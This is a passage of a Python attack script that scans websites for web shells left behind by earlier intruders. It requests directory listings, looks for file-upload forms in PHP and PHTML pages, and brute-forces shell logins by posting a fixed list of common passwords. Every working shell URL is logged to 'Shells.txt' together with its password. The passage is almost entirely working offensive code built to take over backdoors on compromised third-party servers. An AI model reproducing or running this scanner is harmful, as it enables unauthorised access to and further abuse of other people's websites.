							pr00t = requests.post(SH23+shell+'.php',data=password_r00t,timeout=15).content
							if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
								with open('Shells.txt', mode='a') as d:
									d.write(SH23+shell+'.php'+'#r00t')
							else :
								padmin = requests.post(SH23+shell+'.php',data=password_admin,timeout=15).content
								if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH23+shell+'.php'+'#admin')
								else :
									pt00r = requests.post(SH23+shell+'.php',data=password_t00r,timeout=15).content
									if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH23+shell+'.php'+'#t00r')
									else :
										p123 = requests.post(SH23+shell+'.php',data=password_123,timeout=15).content
										if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH23+shell+'.php'+'#123')
										else :
											p1234 = requests.post(SH23+shell+'.php',data=password_1234,timeout=15).content
											if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH23+shell+'.php'+'#1234')
											else :
												p12345 = requests.post(SH23+shell+'.php',data=password_12345,timeout=15).content
												if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH23+shell+'.php'+'#12345')
												else :
													p123456 = requests.post(SH23+shell+'.php',data=password_123456,timeout=15).content
													if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH23+shell+'.php'+'#123456')
													else :
														p123123 = requests.post(SH23+shell+'.php',data=password_123123,timeout=15).content
														if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH23+shell+'.php'+'#123123')
														else :
															p123321 = requests.post(SH23+shell+'.php',data=password_123321,timeout=15).content
															if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH23+shell+'.php'+'#123321')
															else :
																p123456789 = requests.post(SH23+shell+'.php',data=password_123456789,timeout=15).content
																if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH23+shell+'.php'+'#123456789')
																else :
																	p1234567890 = requests.post(SH23+shell+'.php',data=password_1234567890,timeout=15).content
																	if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH23+shell+'.php'+'#1234567890')
																	else :
																		phaurgeulis = requests.post(SH23+shell+'.php',data=password_haurgeulis,timeout=15).content
																		if 'Andela1C3' in phaurgeulis  :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH23+shell+'.php'+'#haurgeulis')
																		else :
																			print(' # '+site +' --> {}[Failed]'.format(fr))
				else :
					print(' # '+site +' --> {}[Failed]'.format(fr))		
		elif 'Index of' in SH23_check and '.phtml' in SH23_check :
			shells = []
			if re.findall(pattern_phtml,SH23_check):
				shells = re.findall(pattern_phtml,SH23_check)			
			for shell in shells:
				sh_check = requests.get(SH23+shell+'.phtml',timeout=15).content
				if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
					with open('Shells.txt', mode='a') as d:
						d.write(SH23+shell+'.phtml')
				elif ' name=pass' in sh_check :
					nhzgrf = requests.post(SH23+shell+'.phtml',data=password_nhzgrf,timeout=15).content
					if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
						with open('Shells.txt', mode='a') as d:
							d.write(SH23+shell+'.phtml'+'#nhzgrf')
					else :
						proot = requests.post(SH23+shell+'.phtml',data=password_root,timeout=15).content
						if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
							with open('Shells.txt', mode='a') as d:
								d.write(SH23+shell+'.phtml'+'#root')
						else :
							pr00t = requests.post(SH23+shell+'.phtml',data=password_r00t,timeout=15).content
							if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
								with open('Shells.txt', mode='a') as d:
									d.write(SH23+shell+'.phtml'+'#r00t')
							else :
								padmin = requests.post(SH23+shell+'.phtml',data=password_admin,timeout=15).content
								if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH23+shell+'.phtml'+'#admin')
								else :
									pt00r = requests.post(SH23+shell+'.phtml',data=password_t00r,timeout=15).content
									if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH23+shell+'.phtml'+'#t00r')
									else :
										p123 = requests.post(SH23+shell+'.phtml',data=password_123,timeout=15).content
										if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH23+shell+'.phtml'+'#123')
										else :
											p1234 = requests.post(SH23+shell+'.phtml',data=password_1234,timeout=15).content
											if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH23+shell+'.phtml'+'#1234')
											else :
												p12345 = requests.post(SH23+shell+'.phtml',data=password_12345,timeout=15).content
												if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH23+shell+'.phtml'+'#12345')
												else :
													p123456 = requests.post(SH23+shell+'.phtml',data=password_123456,timeout=15).content
													if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH23+shell+'.phtml'+'#123456')
													else :
														p123123 = requests.post(SH23+shell+'.phtml',data=password_123123,timeout=15).content
														if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH23+shell+'.phtml'+'#123123')
														else :
															p123321 = requests.post(SH23+shell+'.phtml',data=password_123321,timeout=15).content
															if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH23+shell+'.phtml'+'#123321')
															else :
																p123456789 = requests.post(SH23+shell+'.phtml',data=password_123456789,timeout=15).content
																if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH23+shell+'.phtml'+'#123456789')
																else :
																	p1234567890 = requests.post(SH23+shell+'.phtml',data=password_1234567890,timeout=15).content
																	if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH23+shell+'.phtml'+'#1234567890')
																	else :
																		phaurgeulis = requests.post(SH23+shell+'.phtml',data=password_haurgeulis,timeout=15).content
																		if 'Andela1C3' in phaurgeulis  :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH23+shell+'.phtml'+'#haurgeulis')
																		else :
																			print(' # '+site +' --> {}[Failed]'.format(fr))
				else :
					print(' # '+site +' --> {}[Failed]'.format(fr))
		elif 'Index of' in SH24_check and '.php' in SH24_check :
			shells = []
			if re.findall(pattern_php,SH24_check):
				shells = re.findall(pattern_php,SH24_check)			
			for shell in shells:
				sh_check = requests.get(SH24+shell+'.php',timeout=15).content
				if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
					with open('Shells.txt', mode='a') as d:
						d.write(SH24+shell+'.php')
				elif ' name=pass' in sh_check :
					nhzgrf = requests.post(SH24+shell+'.php',data=password_nhzgrf,timeout=15).content
					if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
						with open('Shells.txt', mode='a') as d:
							d.write(SH24+shell+'.php'+'#nhzgrf')
					else :
						proot = requests.post(SH24+shell+'.php',data=password_root,timeout=15).content
						if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
							with open('Shells.txt', mode='a') as d:
								d.write(SH24+shell+'.php'+'#root')
						else :
							pr00t = requests.post(SH24+shell+'.php',data=password_r00t,timeout=15).content
							if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
								with open('Shells.txt', mode='a') as d:
									d.write(SH24+shell+'.php'+'#r00t')
							else :
								padmin = requests.post(SH24+shell+'.php',data=password_admin,timeout=15).content
								if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH24+shell+'.php'+'#admin')
								else :
									pt00r = requests.post(SH24+shell+'.php',data=password_t00r,timeout=15).content
									if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH24+shell+'.php'+'#t00r')
									else :
										p123 = requests.post(SH24+shell+'.php',data=password_123,timeout=15).content
										if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH24+shell+'.php'+'#123')
										else :
											p1234 = requests.post(SH24+shell+'.php',data=password_1234,timeout=15).content
											if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH24+shell+'.php'+'#1234')
											else :
												p12345 = requests.post(SH24+shell+'.php',data=password_12345,timeout=15).content
												if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH24+shell+'.php'+'#12345')
												else :
													p123456 = requests.post(SH24+shell+'.php',data=password_123456,timeout=15).content
													if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH24+shell+'.php'+'#123456')
													else :
														p123123 = requests.post(SH24+shell+'.php',data=password_123123,timeout=15).content
														if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH24+shell+'.php'+'#123123')
														else :
															p123321 = requests.post(SH24+shell+'.php',data=password_123321,timeout=15).content
															if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH24+shell+'.php'+'#123321')
															else :
																p123456789 = requests.post(SH24+shell+'.php',data=password_123456789,timeout=15).content
																if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH24+shell+'.php'+'#123456789')
																else :
																	p1234567890 = requests.post(SH24+shell+'.php',data=password_1234567890,timeout=15).content
																	if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH24+shell+'.php'+'#1234567890')
																	else :
																		phaurgeulis = requests.post(SH24+shell+'.php',data=password_haurgeulis,timeout=15).content
																		if 'Andela1C3' in phaurgeulis  :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH24+shell+'.php'+'#haurgeulis')
																		else :
																			print(' # '+site +' --> {}[Failed]'.format(fr))		
				else :
					print(' # '+site +' --> {}[Failed]'.format(fr))	
		elif 'Index of' in SH24_check and '.phtml' in SH24_check :
			shells = []
			if re.findall(pattern_phtml,SH24_check):
				shells = re.findall(pattern_phtml,SH24_check)
			for shell in shells:
				sh_check = requests.get(SH24+shell+'.phtml',timeout=15).content
				if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
					with open('Shells.txt', mode='a') as d:
						d.write(SH24+shell+'.phtml')
				elif ' name=pass' in sh_check :
					nhzgrf = requests.post(SH24+shell+'.phtml',data=password_nhzgrf,timeout=15).content
					if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
						with open('Shells.txt', mode='a') as d:
							d.write(SH24+shell+'.phtml'+'#nhzgrf')
					else :
						proot = requests.post(SH24+shell+'.phtml',data=password_root,timeout=15).content
						if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
							with open('Shells.txt', mode='a') as d:
								d.write(SH24+shell+'.phtml'+'#root')
						else :
							pr00t = requests.post(SH24+shell+'.phtml',data=password_r00t,timeout=15).content
							if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
								with open('Shells.txt', mode='a') as d:
									d.write(SH24+shell+'.phtml'+'#r00t')
							else :
								padmin = requests.post(SH24+shell+'.phtml',data=password_admin,timeout=15).content
								if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH24+shell+'.phtml'+'#admin')
								else :
									pt00r = requests.post(SH24+shell+'.phtml',data=password_t00r,timeout=15).content
									if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH24+shell+'.phtml'+'#t00r')
									else :
										p123 = requests.post(SH24+shell+'.phtml',data=password_123,timeout=15).content
										if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH24+shell+'.phtml'+'#123')
										else :
											p1234 = requests.post(SH24+shell+'.phtml',data=password_1234,timeout=15).content
											if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
												with open('Shells.txt', mode='a') as d:
													d.write(SH24+shell+'.phtml'+'#1234')
											else :
												p12345 = requests.post(SH24+shell+'.phtml',data=password_12345,timeout=15).content
												if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
													print(' # '+site +'/ --> {}[Vuln]'.format(fg))
													with open('Shells.txt', mode='a') as d:
														d.write(SH24+shell+'.phtml'+'#12345')
												else :
													p123456 = requests.post(SH24+shell+'.phtml',data=password_123456,timeout=15).content
